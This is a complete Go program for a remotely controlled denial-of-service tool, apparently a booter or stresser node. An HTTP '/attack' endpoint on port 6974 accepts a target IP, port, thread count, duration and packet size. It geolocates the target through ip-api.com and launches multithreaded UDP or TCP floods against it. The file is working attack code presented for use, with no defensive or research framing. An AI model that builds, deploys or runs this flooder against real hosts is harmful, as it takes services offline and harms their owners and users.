package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

type TargetInfo struct {
	IP       string `json:"query"`
	Country  string `json:"country"`
	City     string `json:"city"`
	ISP      string `json:"isp"`
	AS       string `json:"as"`
	Org      string `json:"org"`
}

func udpFlood(wg *sync.WaitGroup, done <-chan struct{}, ip string, port int, packetSize int) {
	defer wg.Done()
	addr := &net.UDPAddr{
		IP:   net.ParseIP(ip),
		Port: port,
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Printf("Failed to connect to %s:%d: %v\n", ip, port, err)
		return
	}
	defer conn.Close()

	packet := make([]byte, packetSize)
	for {
		select {
		case <-done:
			return
		default:
			_, err := conn.Write(packet)
			if err != nil {
				fmt.Printf("Failed to send packet to %s:%d: %v\n", ip, port, err)
				return
			}
		}
	}
}

func tcpFlood(wg *sync.WaitGroup, done <-chan struct{}, ip string, port int, packetSize int) {
	defer wg.Done()
	addr := &net.TCPAddr{
		IP:   net.ParseIP(ip),
		Port: port,
	}
	for {
		select {
		case <-done:
			return
		default:
			conn, err := net.Dial("tcp", addr.String())
			if err != nil {
				fmt.Printf("Failed to connect to %s:%d: %v\n", ip, port, err)
				return
			}
			packet := make([]byte, packetSize)
			_, err = conn.Write(packet)
			if err != nil {
				fmt.Printf("Failed to send packet to %s:%d: %v\n", ip, port, err)
				conn.Close()
				return
			}
			conn.Close()
		}
	}
}

func printAttackDetails(method string, target string, port int, threads int, packetSize int, duration int) string {
	var result strings.Builder
	result.WriteString("Attack Details:\n")
	result.WriteString(fmt.Sprintf("| Status:         [Attack Launched]\n"))
	result.WriteString(fmt.Sprintf("| Method:         [%s]\n", strings.ToUpper(method)))
	result.WriteString(fmt.Sprintf("| Target:         [%s]\n", target))
	if port > 0 {
		result.WriteString(fmt.Sprintf("| Port:           [%d]\n", port))
	}
	result.WriteString(fmt.Sprintf("| Threads:        [%d]\n", threads))
	if packetSize > 0 {
		result.WriteString(fmt.Sprintf("| Packet Size:    [%d]\n", packetSize))
	}
	result.WriteString(fmt.Sprintf("| Time:           [%d]\n", duration))
	result.WriteString(fmt.Sprintf("| Sent Time:      [%s]\n", time.Now().Format("2006.01.02 03:04 PM KST")))

	return result.String()
}

func getTargetDetails(ip string) (*TargetInfo, error) {
	url := fmt.Sprintf("http://ip-api.com/json/%s", ip)
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("Failed to get target details: %v", err)
	}
	defer resp.Body.Close()

	var targetInfo TargetInfo
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("Failed to read response body: %v", err)
	}

	err = json.Unmarshal(body, &targetInfo)
	if err != nil {
		return nil, fmt.Errorf("Failed to parse target details: %v", err)
	}

	return &targetInfo, nil
}

func startAttack(wg *sync.WaitGroup, done chan struct{}, method, ip string, udpPort, tcpPort, packetSize, duration, threads int) {
	for i := 0; i < threads; i++ {
		if method == "udp" {
			wg.Add(1)
			go udpFlood(wg, done, ip, udpPort, packetSize)
		} else if method == "tcp" {
			wg.Add(1)
			go tcpFlood(wg, done, ip, tcpPort, packetSize)
		}
	}

	time.Sleep(time.Duration(duration) * time.Second)
	close(done)
}

func attackHandler(wg *sync.WaitGroup, w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query()

	method := query.Get("method")
	ip := query.Get("target_ip")
	udpPort, err := strconv.Atoi(query.Get("target_port"))
	if err != nil {
		http.Error(w, "Invalid target port", http.StatusBadRequest)
		return
	}
	threads, err := strconv.Atoi(query.Get("threads"))
	if err != nil {
		http.Error(w, "Invalid threads", http.StatusBadRequest)
		return
	}
	duration, err := strconv.Atoi(query.Get("duration"))
	if err != nil {
		http.Error(w, "Invalid duration", http.StatusBadRequest)
		return
	}
	packetSize, err := strconv.Atoi(query.Get("packet_size"))
	if err != nil {
		http.Error(w, "Invalid packet size", http.StatusBadRequest)
		return
	}

	targetInfo, err := getTargetDetails(ip)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	attackDetails := printAttackDetails(method, ip, udpPort, threads, packetSize, duration)

	fmt.Fprintf(w, "%s", attackDetails)

	fmt.Fprintf(w, "\nTarget Details:\n")
	fmt.Fprintf(w, "| Country:       [%s]\n", targetInfo.Country)
	fmt.Fprintf(w, "| City:          [%s]\n", targetInfo.City)
	fmt.Fprintf(w, "| ISP:           [%s]\n", targetInfo.ISP)
	fmt.Fprintf(w, "| ASN:           [%s]\n", targetInfo.AS)
	fmt.Fprintf(w, "| Organization:  [%s]\n", targetInfo.Org)

	done := make(chan struct{})

	fmt.Printf("\nNew Attack Request -> IP: [%s] | Port: [%d] | Method: [%s] | Threads: [%d] | PacketSize: [%d] | Time: [%d] | Sent Time: [%s]\n",
	ip, udpPort, method, threads, packetSize, duration, time.Now().Format("2006.01.02 03:04 PM KST"))

	go startAttack(wg, done, method, ip, udpPort, udpPort, packetSize, duration, threads)
}

func main() {
	var wg sync.WaitGroup

	http.HandleFunc("/attack", func(w http.ResponseWriter, r *http.Request) {
		attackHandler(&wg, w, r)
	})

	fmt.Println("Starting server on port 6974...")
	err := http.ListenAndServe(":6974", nil)
	if err != nil {
		fmt.Println("Error starting server:", err)
	}
}
